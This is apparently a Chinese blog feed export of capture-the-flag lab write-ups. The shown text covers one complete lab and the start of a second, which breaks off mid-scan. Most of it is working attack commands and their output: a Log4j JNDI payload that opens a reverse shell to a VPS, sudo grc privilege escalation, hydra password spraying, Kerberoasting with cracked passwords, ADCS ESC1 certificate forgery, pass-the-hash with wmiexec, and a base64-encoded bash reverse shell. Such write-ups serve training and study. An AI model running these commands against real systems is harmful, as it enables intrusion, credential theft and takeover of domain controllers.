        <content type="html"><![CDATA[<p>fscanæ‰«ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">39.98.122.181:8983 open</span><br><span class="line">39.98.122.181:22 open</span><br><span class="line">39.98.122.181:80 open</span><br></pre></td></tr></table></figure><h2 id="jndiæ³¨å…¥"><a href="#jndiæ³¨å…¥" class="headerlink" title="jndiæ³¨å…¥"></a>jndiæ³¨å…¥</h2><p>8983ç«¯å£ç”¨äº†log4j</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741670564140-6160641a-1b94-44e3-bcbf-9c50ef267877.png"></p><p>dnså¤–å¸¦æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.98.122.181:8983/solr/admin/collections?action=$&#123;jndi:ldap://ew7eu8.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741670671441-2db4d3c7-699d-4d73-9297-c0c39b729750.png"></p><p>æ”¶åˆ°äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741670662520-8bea4efb-67ee-4cb9-8454-ac4a47ad2244.png"></p><p>vpsèµ·jndiexploitï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i VPS_IP</span><br></pre></td></tr></table></figure><p>payloadï¼ŒåŒæ—¶ç›‘å¬9383ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /solr/admin/collections?action=$&#123;jndi:ldap://VPS_IP:1389/Basic/ReverseShell/VPS_IP/9383&#125; HTTP/1.1</span><br><span class="line">Host: 39.99.154.173:8983</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741671298308-e20746fc-74d9-4d06-8576-18109dde7590.png"></p><p>suidæ²¡æ‰¾åˆ°ææƒï¼Œå°è¯•sudo</p><h2 id="grcææƒ"><a href="#grcææƒ" class="headerlink" title="grcææƒ"></a>grcææƒ</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741671335848-763f129d-098e-4c2e-837c-f00c41dd0164.png"></p><p><a href="https://gtfobins.github.io/gtfobins/grc/">https://gtfobins.github.io/gtfobins/grc/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grc find / -name flag*</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741671450842-14c0b103-fd57-47a9-8b45-19abadee7569.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grc cat /root/flag/flag01.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741671506621-13eec0b5-e112-4296-b77a-c9647c362248.png"></p><h2 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h2><p>æ¥ç€æ­ä»£ç†ï¼Œä¼ fscanæ‰«ä¸€ä¸‹9ç½‘æ®µ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741671674722-5e2b972a-8f8e-4088-9548-b16c1482b031.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.9.19     is alive</span><br><span class="line">(icmp) Target 172.22.9.47     is alive</span><br><span class="line">(icmp) Target 172.22.9.7      is alive</span><br><span class="line">(icmp) Target 172.22.9.26     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.9.7:135 open</span><br><span class="line">172.22.9.19:8983 open</span><br><span class="line">172.22.9.47:21 open</span><br><span class="line">172.22.9.19:80 open</span><br><span class="line">172.22.9.47:22 open</span><br><span class="line">172.22.9.19:22 open</span><br><span class="line">172.22.9.26:445 open</span><br><span class="line">172.22.9.7:445 open</span><br><span class="line">172.22.9.47:445 open</span><br><span class="line">172.22.9.26:139 open</span><br><span class="line">172.22.9.7:139 open</span><br><span class="line">172.22.9.47:139 open</span><br><span class="line">172.22.9.26:135 open</span><br><span class="line">172.22.9.7:88 open</span><br><span class="line">172.22.9.7:80 open</span><br><span class="line">172.22.9.47:80 open</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.26</span><br><span class="line">   [-&gt;]DESKTOP-CBKTVMO</span><br><span class="line">   [-&gt;]172.22.9.26</span><br><span class="line">[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC    </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.9.7</span><br><span class="line">   [-&gt;]XIAORANG-DC</span><br><span class="line">   [-&gt;]172.22.9.7</span><br><span class="line">[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!</span><br><span class="line">[*] NetBios 172.22.9.47     fileserver                          Windows 6.1</span><br><span class="line">[*] OsInfo 172.22.9.47  (Windows 6.1)</span><br><span class="line">[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None è·³è½¬url: http://172.22.9.19:8983/solr/</span><br><span class="line">[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin</span><br><span class="line">[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect </span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.9.7 XIAORANG-DC</span><br><span class="line">172.22.9.19 å½“å‰è¢«æ§æœºå™¨</span><br><span class="line">172.22.9.26 DESKTOP-CBKTVMO</span><br><span class="line">172.22.9.47 fileserver</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ä¸Šæ ‡ç­¾æœ‰smbï¼ŒçŒœæµ‹æ˜¯æœ‰smbæœåŠ¡ï¼Œfscanä¸­æœ‰ä¸€ä¸ªfileserverï¼Œè¿æ¥è¯•è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 smbclient.py 172.22.9.47</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741672576600-e9b0737e-6335-47dd-9590-d4c2221dfc62.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741672726406-5463716f-3b77-4302-a73e-90c6d8547bee.png"></p><p>secretä¸‹æ‹¿åˆ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741672777428-a5a263c5-3d81-432d-adac-b07f765d043a.png"></p><p>æ¥ç€å›æ ¹ç›®å½•ç”¨get personnel.dbä¸‹ä¸€ä¸‹è¿™ä¸ªæ•°æ®åº“ï¼Œçœ‹äº†ä¸€ä¸‹æœ‰ä¸ªuserè¡¨é‡Œæœ‰å¯†ç ä½†æ²¡ç”¨æˆ·å</p><p>å¯¼å…¥çœ‹ä¸€ä¸‹ï¼Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741673037884-b3c06977-d178-406f-a872-2a2780c58b7c.png"></p><p>ä¸€å †ç”¨æˆ·åå’Œå¯†ç ï¼Œå°è¯•å¯†ç å–·æ´’</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741673156532-ac68644c-79e9-4faf-b1c3-e00a888c1791.png"></p><h2 id="å¯†ç å–·æ´’"><a href="#å¯†ç å–·æ´’" class="headerlink" title="å¯†ç å–·æ´’"></a>å¯†ç å–·æ´’</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra -L user.txt -P pass.txt 172.22.9.26 rdp &gt;&gt;result.txt</span><br><span class="line">cat result.txt|| grep account</span><br></pre></td></tr></table></figure><p>å°è¯•å‡ºæ¥è¿™ä¸¤ä¸ªå¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangjian:i9XDE02pLVf</span><br><span class="line">liupeng:fiAzGwEMgTY</span><br></pre></td></tr></table></figure><h2 id="kerberoastingæ”»å‡»"><a href="#kerberoastingæ”»å‡»" class="headerlink" title="kerberoastingæ”»å‡»"></a>kerberoastingæ”»å‡»</h2><p>å‰é¢æç¤ºè¯´äº†spnï¼Œå°è¯•æ‰¾åŸŸç”¨æˆ·ä¸‹çš„spn</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741673333639-314cee9e-b6c5-4331-9ae4-c651d0cd967f.png"></p><p>ä¿å­˜ä¸‹æ¥çˆ†ç ´hash</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741673421020-68374d3e-22dc-46d4-a8ac-9cb0e648b56d.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangxia:MyPass2@@6</span><br><span class="line">chenchen:@Passw0rd@</span><br></pre></td></tr></table></figure><p>å†rdpä¸Šå»å‘ç°æ²¡æƒé™è®¿é—®adminç›®å½•ä¸‹æ–‡ä»¶ï¼ŒåŒæ—¶å‘ç°äº†172.22.9.13 CAåŸŸæˆå‘˜æœº</p><h2 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h2><p>å†å›å»çœ‹é¢˜ç›®è¯´ADCSï¼ŒçŒœæµ‹æ˜¯æ‹¿é‚£å°CAé€šè¿‡è¯ä¹¦æ‹¿åŸŸæ§ï¼Œå…ˆæšä¸¾æœ‰å“ªäº›è¯ä¹¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy-ad find -u &#x27;liupeng@xiaorang.lab&#x27; -password &#x27;fiAzGwEMgTY&#x27; -dc-ip 172.22.9.7 -vulnerable -stdout</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 35 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 13 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27; via CSRA</span><br><span class="line">[proxychains] Strict chain  ...  1.92.148.33:5566  ...  XIAORANG-DC.xiaorang.lab:135 &lt;--socket error or timeout!</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27; via CSRA: Could not connect: [Errno 111] Connection refused</span><br><span class="line">[*] Trying to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27; via RRP</span><br><span class="line">[proxychains] Strict chain  ...  1.92.148.33:5566  ...  XIAORANG-DC.xiaorang.lab:445 &lt;--socket error or timeout!</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27; via RRP: [Errno Connection error (224.0.0.1:445)] [Errno 111] Connection refused</span><br><span class="line">[!] Failed to get CA configuration for &#x27;xiaorang-XIAORANG-DC-CA&#x27;</span><br><span class="line">[proxychains] Strict chain  ...  1.92.148.33:5566  ...  XIAORANG-DC.xiaorang.lab:80 &lt;--socket error or timeout!</span><br><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    DNS Name                            : XIAORANG-DC.xiaorang.lab</span><br><span class="line">    Certificate Subject                 : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab</span><br><span class="line">    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5</span><br><span class="line">    Certificate Validity Start          : 2023-07-14 04:33:21+00:00</span><br><span class="line">    Certificate Validity End            : 2028-07-14 04:43:21+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Unknown</span><br><span class="line">    Request Disposition                 : Unknown</span><br><span class="line">    Enforce Encryption for Requests     : Unknown</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : XR Manager</span><br><span class="line">    Display Name                        : XR Manager</span><br><span class="line">    Certificate Authorities             : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : PublishToDs</span><br><span class="line">                                          IncludeSymmetricAlgorithms</span><br><span class="line">    Private Key Flag                    : ExportableKey</span><br><span class="line">    Extended Key Usage                  : Encrypting File System</span><br><span class="line">                                          Secure Email</span><br><span class="line">                                          Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1 year</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Domain Users</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Authenticated Users</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : XIAORANG.LAB\Administrator</span><br><span class="line">        Write Owner Principals          : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">        Write Dacl Principals           : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">        Write Property Principals       : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#x27;XIAORANG.LAB\\Domain Users&#x27; and &#x27;XIAORANG.LAB\\Authenticated Users&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br><span class="line">                                              </span><br></pre></td></tr></table></figure><p>å‘ç°ESC1ï¼Œæ”¹ä¸€ä¸‹hosts</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741674326163-82e19d96-50b0-4f36-9d87-98a250042742.png"></p><h2 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h2><p>ç”³è¯· XR Manager è¯ä¹¦æ¨¡ç‰ˆå¹¶ä¼ªé€ åŸŸç®¡ç†å‘˜ï¼Œå¾—åˆ°administrator.pfx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad req -u &#x27;liupeng@xiaorang.lab&#x27; -p &#x27;fiAzGwEMgTY&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &quot;xiaorang-XIAORANG-DC-CA&quot; -template &#x27;XR Manager&#x27; -upn administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741674366122-ec515c94-3a70-4a97-9166-b2dcad9ab192.png"></p><p>åˆ©ç”¨administrator.pfxè¯ä¹¦è·å– TGT å’Œ NTLM Hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741674465823-6232981d-5b0d-45da-9377-1113b83596c3.png"></p><p>æ‹¿åˆ°åŸŸæ§hashï¼Œæ‰“pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes :2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.7 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741674635851-3a709ffb-d1b8-4334-b055-6585b32b1317.png"></p><p>å†ä¸Šå¦ä¸€å°æœºå™¨ï¼Œæ‹¿3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/Administrator@172.22.9.26 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘å¢ƒ-Hostpital</title>
      <link href="/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/"/>
      <url>/2025/03/09/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/</url>
      
        <content type="html"><![CDATA[<h2 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h2><p>å‘ç°ç½‘é¡µ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506535224-058b8b94-639d-4e3b-9411-b6ac1b340566.png"></p><p>dirsearchæ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://39.99.138.184:8080/</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506304278-680dd407-b95f-4ad0-9c6f-7f702d2701c8.png"></p><p>å‘ç°å†…å­˜æ³„æ¼ï¼Œdumpä¸‹æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°shiroçš„key</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506431241-6b9a66a0-c9bb-491a-93bd-6a2b54efa2dc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">===========================================</span><br><span class="line">CookieRememberMeManager(ShiroKey)</span><br><span class="line">-------------</span><br><span class="line">algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES</span><br></pre></td></tr></table></figure><p>æ‰¾shiroæ¡†æ¶åˆ©ç”¨å·¥å…·</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506596467-5cf0c16c-a23c-464c-a6fb-9a9c11fd8a94.png"></p><p>å¯ä»¥çœ‹åˆ°ä½æƒé™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506691266-06c309f6-7c64-47fc-9249-f3ef31b44644.png"></p><h2 id="suidææƒ"><a href="#suidææƒ" class="headerlink" title="suidææƒ"></a>suidææƒ</h2><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506765818-d9b07ec8-c1fe-4707-b162-68e6bcb817e9.png"></p><p>ä½¿ç”¨vimææƒæŸ¥çœ‹æ–‡ä»¶ï¼Œæ­¤æ—¶å¿…é¡»æœ‰äº¤äº’å¼shellæ‰èƒ½æŸ¥çœ‹ï¼Œæ–¹ä¾¿åˆ©ç”¨å¼¹ä¸ªshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eC54eC54eC54eC8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.basic /root/flag/flag01.txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741507324978-a395d97c-8870-434c-bff6-2f620761c70a.png"></p><p>ä¼ ä¸ªfscanæ‰«ä¸€ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741507507340-8e9d1a33-4465-4c09-ab65-b27204494342.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.30.12.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.30.12.5     is alive</span><br><span class="line">(icmp) 